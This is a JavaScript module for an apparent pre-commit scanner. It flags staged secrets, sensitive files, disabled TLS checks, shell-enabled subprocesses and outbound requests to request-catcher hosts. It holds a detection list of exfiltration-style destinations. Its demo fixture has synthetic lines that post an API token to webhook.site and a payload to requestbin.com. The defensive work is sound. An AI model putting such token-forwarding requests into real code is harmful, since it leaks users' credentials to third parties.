'use strict';

const { isAllowedHost, isIgnoredPath } = require('./config');

const SEVERITY_ORDER = Object.freeze({ low: 1, medium: 2, high: 3, critical: 4 });

const PROVIDER_RULES = [
  {
    id: 'AWS-001', name: 'AWS access key ID', severity: 'critical', weight: 6,
    pattern: /\bAKIA[0-9A-Z]{16}\b/g,
    message: 'An AWS access-key-shaped identifier was added.',
    recommendation: 'Remove it from the change and rotate it with AWS if it was real.',
  },
  {
    id: 'GH-001', name: 'GitHub token', severity: 'critical', weight: 6,
    pattern: /\bgh[pousr]_[A-Za-z0-9]{36,}\b/g,
    message: 'A GitHub-token-shaped value was added.',
    recommendation: 'Use a GitHub Actions secret or a short-lived credential; revoke exposed tokens.',
  },
  {
    id: 'ANT-001', name: 'Anthropic API key', severity: 'critical', weight: 6,
    pattern: /\bsk-ant-[A-Za-z0-9_-]{20,}\b/g,
    message: 'An Anthropic API-key-shaped value was added.',
    recommendation: 'Load the key from a secret manager or environment variable and rotate it if real.',
  },
  {
    id: 'OAI-001', name: 'OpenAI API key', severity: 'critical', weight: 6,
    pattern: /\bsk-(?!ant-)(?:proj-)?[A-Za-z0-9_-]{32,}\b/g,
    message: 'An OpenAI API-key-shaped value was added.',
    recommendation: 'Load the key from a secret manager or environment variable and rotate it if real.',
  },
  {
    id: 'STR-001', name: 'Stripe live secret/restricted key', severity: 'critical', weight: 6,
    pattern: /\b(?:sk|rk)_live_[0-9A-Za-z]{16,}\b/g,
    message: 'A Stripe live-key-shaped value was added.',
    recommendation: 'Remove the value and rotate it in the Stripe dashboard if it was real.',
  },
  {
    id: 'SLK-001', name: 'Slack token', severity: 'high', weight: 5,
    pattern: /\bxox[abprs]-[A-Za-z0-9-]{10,}\b/g,
    message: 'A Slack-token-shaped value was added.',
    recommendation: 'Use a managed secret and revoke exposed Slack tokens.',
  },
  {
    id: 'GCP-001', name: 'Google API key', severity: 'high', weight: 4,
    pattern: /\bAIza[0-9A-Za-z_-]{35}\b/g,
    message: 'A Google API-key-shaped value was added.',
    recommendation: 'Restrict the key by API and application, or rotate it if exposed.',
  },
  {
    id: 'KEY-001', name: 'Private key material', severity: 'critical', weight: 7,
    pattern: /-----BEGIN (?:RSA |EC |OPENSSH |DSA |PGP )?PRIVATE KEY-----/g,
    message: 'A private-key block header was added.',
    recommendation: 'Do not commit private key material. Replace it with a secret-manager reference.',
  },
];

const GENERIC_ASSIGNMENT = /(password|passwd|secret|api[_-]?key|access[_-]?(?:key|token)|auth[_-]?token|client[_-]?secret|private[_-]?key|credential|token)\s*[:=]\s*(?:"([^"\r\n]{8,})"|'([^'\r\n]{8,})'|([^\s,;#]{8,}))/ig;
const ENV_ASSIGNMENT = /^\s*(?:export\s+)?([A-Za-z_][\w.-]*(?:KEY|TOKEN|SECRET|PASSWORD|PASSWD|CREDENTIAL)[\w.-]*)\s*=\s*(.*?)\s*$/i;
const ENV_REFERENCE = /(?:process\.env(?:\.[A-Za-z_$][\w$]*|\[['"][^'"]+['"]\])|import\.meta\.env\.[A-Za-z_$][\w$]*|(?:process\.)?getenv\s*\(|os\.getenv\s*\(|secrets?\.get\s*\(|vault\.)/i;
const SENSITIVE_ENV_BINDING = /\b(?:const|let|var)\s+([A-Za-z_$][\w$]*)\s*=\s*(?:process\.env(?:\.[A-Za-z_$][\w$]*|\[['"][^'"]+['"]\])|import\.meta\.env\.[A-Za-z_$][\w$]*|(?:process\.)?getenv\s*\(|os\.getenv\s*\()/i;
const DIRECT_SENSITIVE_ENV = /(?:process\.env\.(?:\w*(?:KEY|TOKEN|SECRET|PASSWORD|CREDENTIAL)\w*)|(?:os\.)?getenv\s*\(\s*['"][^'"]*(?:KEY|TOKEN|SECRET|PASSWORD|CREDENTIAL)[^'"]*['"])/i;
const OUTBOUND_SINK = /(?:\bfetch\s*\(|\baxios\s*\.|\brequests?\s*\.\s*(?:get|post|put|patch|delete|request)\s*\(|\bhttps?\s*\.\s*request\s*\(|\bhttpx?\s*\.(?:get|post|put|patch|delete|request)\s*\(|\burllib\.request\b|\bcurl\s+|\bwget\s+|\bsendBeacon\s*\()/i;
const URL_PATTERN = /https?:\/\/[^\s"'`<>]+/gi;
const SUSPICIOUS_HOSTS = [
  /(?:^|\.)webhook\.site$/i,
  /(?:^|\.)requestbin\.(?:com|net|org)$/i,
  /(?:^|\.)pipedream\.net$/i,
  /(?:^|\.)ngrok(?:-free)?\.(?:io|app|dev)$/i,
  /(?:^|\.)interact\.sh$/i,
  /(?:^|\.)oast\.[a-z0-9.-]+$/i,
  /(?:^|\.)burpcollaborator\.net$/i,
  /(?:^|\.)discord(?:app)?\.com$/i,
  /(?:^|\.)api\.telegram\.org$/i,
];
const SENSITIVE_FILE = /(?:^|\/)(?:\.env(?:\.[\w.-]+)?|id_(?:rsa|ed25519)|[^/]+\.(?:pem|p12|pfx|key))$/i;
const SAFE_FILE_SUFFIX = /\.(?:example|sample|template|dist)$/i;
const PLACEHOLDER = /^(?:|changeme|change_me|change-me|replace_me|replace-me|your[_-].*|placeholder|example|dummy|test|none|null|undefined|xxx+|0+|todo)$/i;
const VARIABLE_REFERENCE = /^(?:\$\{?[A-Za-z_][\w.:-]*\}?|%[A-Za-z_][\w]*%|process\.env\b|import\.meta\.env\b|os\.getenv\b|getenv\b|secretmanager\b|secrets?\.get\b|vault\b|config\b)/i;

const TIER_LABELS = [
  { max: 0, name: "Denny's Dishwasher", note: 'No findings. Your repository is as threatening as a dishwasher. Proceed.' },
  { max: 2, name: 'Mid-Level Manager', note: 'Minor irregularities noted. A strongly worded email may follow.' },
  { max: 5, name: 'Series A Founder', note: 'Leadership has been looped in. A slide deck is being prepared.' },
  { max: 9, name: 'Crypto Exchange CFO', note: 'Legal has joined the call. Nobody is sure who invited Legal.' },
  { max: 14, name: 'Senate Hearing Witness', note: 'Counsel advises you to stop typing.' },
  { max: Number.POSITIVE_INFINITY, name: 'Congressional Subpoena', note: 'A gentleman in a nice suit would like a word. Under oath.' },
];

function cleanValue(value) {
  return String(value || '').trim().replace(/^['"]|['"]$/g, '').trim();
}

function isPlaceholderValue(value) {
  const cleaned = cleanValue(value);
  if (PLACEHOLDER.test(cleaned)) return true;
  if (VARIABLE_REFERENCE.test(cleaned)) return true;
  if (/^(?:\[redacted\]|<[^>]+>|\*{4,})$/i.test(cleaned)) return true;
  if (/^(?:your|replace|insert|paste)[-_ ]/i.test(cleaned)) return true;
  return false;
}

function lineKey(file, line, id) {
  return `${id}\0${file}\0${line}`;
}

function addFinding(findings, seen, finding) {
  const key = lineKey(finding.file, finding.line, finding.id);
  if (seen.has(key)) return;
  seen.add(key);
  findings.push({
    id: finding.id,
    name: finding.name,
    severity: finding.severity,
    weight: finding.weight,
    file: finding.file,
    line: finding.line,
    message: finding.message,
    recommendation: finding.recommendation,
    evidence: finding.evidence || 'Sensitive value withheld; inspect the staged line locally.',
  });
}

function extractUrls(text) {
  return [...text.matchAll(URL_PATTERN)].map((match) => {
    const candidate = match[0].replace(/[),.;\]}]+$/g, '');
    try {
      return new URL(candidate);
    } catch {
      return null;
    }
  }).filter(Boolean);
}

function hostIsSuspicious(hostname) {
  return SUSPICIOUS_HOSTS.some((pattern) => pattern.test(hostname));
}

function urlIsSuspicious(url) {
  const host = url.hostname.toLowerCase();
  if (hostIsSuspicious(host)) {
    if (host === 'discord.com' || host === 'discordapp.com') return /\/api\/webhooks\//i.test(url.pathname);
    if (host === 'api.telegram.org') return /\/bot[^/]+\//i.test(url.pathname);
    return true;
  }
  return host === 'pastebin.com' && /^\/raw(?:\/|$)/i.test(url.pathname);
}

function isSensitiveFile(file) {
  const normalized = file.replace(/\\/g, '/');
  return SENSITIVE_FILE.test(normalized) && !SAFE_FILE_SUFFIX.test(normalized);
}

function scanChanges({ items = [], names = [] }, config = {}) {
  const policy = {
    allowedHosts: config.allowedHosts || [],
    ignoredPaths: config.ignoredPaths || [],
    disabledRules: new Set(config.disabledRules || []),
  };
  const findings = [];
  const seen = new Set();
  const relevantItems = items.filter((item) =>
    !isIgnoredPath(item.file, policy.ignoredPaths) &&
    !item.text.includes('honeypot-guard:ignore')
  );
  const itemsByFile = new Map();
  for (const item of relevantItems) {
    if (!itemsByFile.has(item.file)) itemsByFile.set(item.file, []);
    itemsByFile.get(item.file).push(item);
  }

  for (const [file, fileItems] of itemsByFile) {
    const envFile = /(?:^|\/)\.env(?:\.[\w.-]+)?$/i.test(file) && !SAFE_FILE_SUFFIX.test(file);
    for (const item of fileItems) {
      const specificBefore = findings.length;

      for (const rule of PROVIDER_RULES) {
        if (policy.disabledRules.has(rule.id)) continue;
        const matches = [...item.text.matchAll(rule.pattern)];
        if (!matches.length) continue;
        const token = matches[0][0];
        if (rule.id === 'AWS-001' && token.endsWith('EXAMPLE')) continue;
        addFinding(findings, seen, {
          ...rule,
          file,
          line: item.line,
          evidence: 'Credential-shaped value detected; matched content is never printed.',
        });
      }

      if (!envFile && !policy.disabledRules.has('GEN-001')) {
        GENERIC_ASSIGNMENT.lastIndex = 0;
        for (const match of item.text.matchAll(GENERIC_ASSIGNMENT)) {
          const value = match[2] || match[3] || match[4] || '';
          const isQuotedLiteral = Boolean(match[2] || match[3]);
          if (isPlaceholderValue(value)) continue;
          if (!isQuotedLiteral && /[\[\]().{}]/.test(value)) continue;
          const alreadySpecific = findings.slice(specificBefore).some((finding) => finding.file === file && finding.line === item.line);
          if (alreadySpecific) continue;
          addFinding(findings, seen, {
            id: 'GEN-001', name: 'Hardcoded credential assignment', severity: 'high', weight: 4,
            file, line: item.line,
            message: 'A credential-like field is assigned a literal value.',
            recommendation: 'Replace the literal with an environment or secret-manager reference; rotate it if real.',
            evidence: `Credential-like field "${match[1]}" has a literal value; value withheld.`,
          });
          break;
        }
      }

      if (envFile && !policy.disabledRules.has('ENV-001')) {
        const envMatch = item.text.match(ENV_ASSIGNMENT);
        if (envMatch && !isPlaceholderValue(envMatch[2])) {
          const alreadySpecific = findings.slice(specificBefore).some((finding) => finding.file === file && finding.line === item.line);
          if (!alreadySpecific) {
            addFinding(findings, seen, {
              id: 'ENV-001', name: 'Non-placeholder value in staged environment file', severity: 'high', weight: 4,
              file, line: item.line,
              message: 'A staged environment file contains a non-placeholder sensitive assignment.',
              recommendation: 'Do not commit populated environment files. Keep an example template and rotate exposed values.',
              evidence: `Environment variable "${envMatch[1]}" has a value; value withheld.`,
            });
          }
        }
      }

      const isSink = OUTBOUND_SINK.test(item.text);
      if (isSink) {
        const urls = extractUrls(item.text);
        for (const url of urls) {
          const hostname = url.hostname.toLowerCase();
          if (urlIsSuspicious(url) && !policy.disabledRules.has('NET-001')) {
            addFinding(findings, seen, {
              id: 'NET-001', name: 'Known request-catcher or exfiltration-style destination', severity: 'high', weight: 5,
              file, line: item.line,
              message: 'An outbound request targets a host commonly used for request capture, tunnelling, or payload collection.',
              recommendation: 'Verify the business purpose and ownership of the destination. Prefer an approved, documented endpoint.',
              evidence: `Outbound request host: ${hostname}. URL path, query, and credentials are withheld.`,
            });
          }
          if (netIsIp(hostname) && !policy.disabledRules.has('NET-002')) {
            addFinding(findings, seen, {
              id: 'NET-002', name: 'Outbound request to literal IP address', severity: 'medium', weight: 2,
              file, line: item.line,
              message: 'An outbound request uses a literal IP address instead of a named service endpoint.',
              recommendation: 'Confirm the destination is controlled and documented; prefer an approved hostname where possible.',
              evidence: `Outbound request uses literal IP destination ${hostname}.`,
            });
          }
          if (url.protocol === 'http:' && !policy.disabledRules.has('TLS-002')) {
            addFinding(findings, seen, {
              id: 'TLS-002', name: 'Plain HTTP outbound request', severity: 'medium', weight: 2,
              file, line: item.line,
              message: 'An outbound request uses unencrypted HTTP.',
              recommendation: 'Use HTTPS unless the destination is a deliberately isolated local test service.',
              evidence: `Outbound request host: ${hostname}; URL path and query are withheld.`,
            });
          }
          if (policy.allowedHosts.length && !isAllowedHost(hostname, policy.allowedHosts) && !policy.disabledRules.has('NET-003')) {
            addFinding(findings, seen, {
              id: 'NET-003', name: 'Outbound host is not in the configured allowlist', severity: 'medium', weight: 2,
              file, line: item.line,
              message: 'An outbound request targets a host not listed in the project policy.',
              recommendation: 'Confirm the destination and add the exact hostname to allowedHosts only after review.',
              evidence: `Unallowlisted outbound host: ${hostname}.`,
            });
          }
        }
      }

      if (!policy.disabledRules.has('TLS-001') && /(?:\bverify\s*=\s*false\b|\brejectUnauthorized\s*:\s*false\b|NODE_TLS_REJECT_UNAUTHORIZED\s*['"]?\s*[:=]\s*['"]?0\b|\bcurl\s+-k(?:\s|$))/i.test(item.text)) {
        addFinding(findings, seen, {
          id: 'TLS-001', name: 'TLS certificate verification disabled', severity: 'medium', weight: 2,
          file, line: item.line,
          message: 'TLS certificate validation appears to be disabled.',
          recommendation: 'Restore certificate validation. Use a local test CA rather than disabling verification.',
          evidence: 'A TLS-verification bypass pattern was found; surrounding source is not reproduced.',
        });
      }

      if (!policy.disabledRules.has('PROC-001') && /\b(?:spawn|exec|execFile)\s*\([^\n]*\bshell\s*:\s*true\b/i.test(item.text)) {
        addFinding(findings, seen, {
          id: 'PROC-001', name: 'Shell-enabled subprocess invocation', severity: 'medium', weight: 2,
          file, line: item.line,
          message: 'A subprocess call enables shell interpretation.',
          recommendation: 'Prefer argument arrays with shell disabled; validate any user-controlled input.',
          evidence: 'A shell-enabled subprocess pattern was found; command content is withheld.',
        });
      }
    }
  }

  // Heuristic only: connect a staged environment-derived sensitive variable to an
  // outbound sink in the same file when the identifier appears in the request line.
  if (!policy.disabledRules.has('FLOW-001')) {
    for (const [file, fileItems] of itemsByFile) {
      const bindings = [];
      for (const item of fileItems) {
        const match = item.text.match(SENSITIVE_ENV_BINDING);
        if (match && /(?:KEY|TOKEN|SECRET|PASSWORD|CREDENTIAL)/i.test(item.text)) {
          bindings.push({ identifier: match[1], line: item.line });
        }
      }
      for (const item of fileItems) {
        if (!OUTBOUND_SINK.test(item.text)) continue;
        const directEnv = DIRECT_SENSITIVE_ENV.test(item.text);
        const linked = bindings.some((binding) =>
          Math.abs(binding.line - item.line) <= 20 &&
          new RegExp(`\\b${escapeRegExp(binding.identifier)}\\b`).test(item.text)
        );
        if (directEnv || linked) {
          addFinding(findings, seen, {
            id: 'FLOW-001', name: 'Possible credential-to-network flow', severity: 'high', weight: 5,
            file, line: item.line,
            message: 'A sensitive environment-derived value appears in or is referenced by an outbound request.',
            recommendation: 'Review the request payload and destination. Avoid forwarding credentials to third-party endpoints.',
            evidence: 'A lightweight same-file identifier heuristic linked a sensitive value to an outbound sink; this is not full data-flow analysis.',
          });
        }
      }
    }
  }

  for (const file of names) {
    if (isIgnoredPath(file, policy.ignoredPaths)) continue;
    if (isSensitiveFile(file) && !policy.disabledRules.has('FIL-001')) {
      addFinding(findings, seen, {
        id: 'FIL-001', name: 'Sensitive file staged for commit', severity: 'critical', weight: 6,
        file, line: 0,
        message: 'A file commonly used to store private keys, credentials, or environment secrets is staged.',
        recommendation: 'Remove it from the index, add an appropriate ignore rule, and rotate any credential that was exposed.',
        evidence: 'Sensitive filename detected; file contents are not read or reported.',
      });
    }
  }

  findings.sort((a, b) => {
    const severityDelta = SEVERITY_ORDER[b.severity] - SEVERITY_ORDER[a.severity];
    return severityDelta || a.file.localeCompare(b.file) || a.line - b.line || a.id.localeCompare(b.id);
  });
  const score = findings.reduce((total, finding) => total + finding.weight, 0);
  const rating = TIER_LABELS.find((tier) => score <= tier.max) || TIER_LABELS[TIER_LABELS.length - 1];
  const counts = { critical: 0, high: 0, medium: 0, low: 0 };
  for (const finding of findings) counts[finding.severity] += 1;

  return { findings, score, rating: rating.name, ratingNote: rating.note, counts };
}

function netIsIp(hostname) {
  return /^\d{1,3}(?:\.\d{1,3}){3}$/.test(hostname);
}

function escapeRegExp(value) {
  return value.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
}

function demoChanges() {
  const join = (...parts) => parts.join('');
  return {
    names: ['.env', 'src/config.js', 'src/network.js', 'scripts/telemetry.py'],
    items: [
      { file: 'src/config.js', line: 12, text: `const awsAccess = "${join('AKIA', 'ABCDEFGHIJKLMNOP')}";` },
      { file: 'src/config.js', line: 14, text: `const ghToken = "${join('gh', 'p_', 'a'.repeat(36))}";` },
      { file: 'src/db.js', line: 9, text: `const password = "${join('demo', 'pass', 'word', '1234')}";` },
      { file: 'src/network.js', line: 3, text: 'const apiToken = process.env.SERVICE_API_TOKEN;' },
      { file: 'src/network.js', line: 8, text: `fetch("${join('https://', 'webhook.site', '/synthetic-demo')}", { method: "POST", body: JSON.stringify({ apiToken }) });` }, // honeypot-guard:ignore
      { file: 'src/network.js', line: 12, text: 'client.get("https://api.example.test/data", { verify: false });' },
      { file: 'scripts/telemetry.py', line: 41, text: `requests.post("${join('https://', 'requestbin.com', '/r/synthetic')}", data=payload)` },
      { file: '.env', line: 1, text: `SERVICE_API_TOKEN=${join('synthetic', 'demo', 'only', 'value')}` },
    ],
  };
}

module.exports = {
  PROVIDER_RULES,
  SEVERITY_ORDER,
  TIER_LABELS,
  demoChanges,
  isPlaceholderValue,
  scanChanges,
};
